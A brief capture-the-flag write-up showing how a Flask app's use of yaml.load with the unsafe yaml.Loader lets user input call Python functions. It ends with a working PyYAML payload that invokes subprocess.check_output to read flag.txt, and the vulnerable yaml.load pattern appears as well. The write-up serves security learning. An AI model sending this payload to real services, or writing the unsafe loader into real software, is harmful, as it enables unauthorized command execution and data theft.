# 🛡️ Challenge Writeup — YAML Injection

> **Author:** s0ufm3l
---

## 📜 Challenge Description

We are given a Flask web application with the following important part:

```python
config = request.form.get("config", "")
try:
    data = yaml.load(config, Loader=yaml.Loader)
    output = str(data)
except Exception as e:
    output = f"Error parsing YAML: {e}"
```
The user input config is parsed directly using yaml.load with yaml.Loader.

## 📥 Code Analysis

The vulnerable line is:

```python
data = yaml.load(config, Loader=yaml.Loader)
```
yaml.load without SafeLoader is dangerous because it can deserialize arbitrary Python objects.

If the user provides a malicious YAML input, it can execute functions or create objects.

### 🧠 Exploitation Strategy

Using PyYAML's object deserialization, you can:

    Execute arbitrary Python functions

    Run system commands

    Read files (like flag.txt)

One common primitive is using:

```less
!!python/object/apply:some_function [arguments]
```
Which tells PyYAML to call a Python function with the given arguments.

### 🚀 Exploit Payload

!!python/object/apply:subprocess.check_output [["cat", "flag.txt"]]

How it works:

    !!python/object/apply:subprocess.check_output → calls the subprocess.check_output function.

    [["cat", "flag.txt"]] → passes the command cat flag.txt as a list of arguments.

    This reads the contents of flag.txt and returns it.